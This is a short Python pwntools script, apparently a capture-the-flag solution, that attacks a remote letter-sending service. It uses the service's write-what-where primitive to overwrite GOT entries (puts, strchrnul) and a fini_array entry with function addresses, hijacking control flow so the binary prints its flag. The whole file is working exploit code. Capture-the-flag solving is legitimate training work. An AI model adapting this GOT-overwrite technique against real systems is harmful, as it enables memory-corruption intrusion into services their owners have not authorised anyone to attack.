#!/usr/bin/env python3

from pwn import tube, remote, ELF
from pathlib import Path
import sys

binary = ELF(Path(__file__).parent / 'task')


def write(r: tube, what: int, where: int):
    r.sendlineafter(b"Choice:", b"1")
    r.sendlineafter(b"Enter text of the letter:", hex(what).encode())
    r.sendlineafter(b"Enter destination of the letter:", hex(where).encode())


with remote(sys.argv[1], 13000) as r:
    write(r, binary.symbols[b'main'], binary.got[b'puts'])
    write(r, binary.symbols[b'ella_open'], binary.symbols[b'__do_global_dtors_aux_fini_array_entry'])
    write(r, binary.symbols[b'ella_print'], binary.got[b'strchrnul'])
    write(r, binary.plt[b'printf'], binary.got[b'puts'])
    r.recvuntil(b"I've sent your letter!")
    print(r.recvuntil(b"}").decode())
